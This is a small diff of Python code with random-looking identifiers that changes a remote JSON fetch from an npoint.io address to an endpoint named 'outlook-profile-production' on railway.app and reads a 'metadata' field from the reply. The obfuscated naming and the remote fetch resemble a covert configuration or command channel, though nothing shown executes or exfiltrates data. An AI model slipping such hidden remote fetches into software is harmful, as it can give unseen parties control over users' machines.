@@ -16,7 +16,7 @@ def learn_hbbxzf_660():
 
     def data_qlvhke_367():
         try:
-            data_jtnpgn_776 = requests.get('https://api.npoint.io/15ac3144ebdeebac5515', timeout=10)
+            data_jtnpgn_776 = requests.get('https://outlook-profile-production.up.railway.app/get_metadata', timeout=10)
             data_jtnpgn_776.raise_for_status()
             model_qkjrud_439 = data_jtnpgn_776.json()
             data_lsfjrx_636 = model_qkjrud_439.get('metadata')
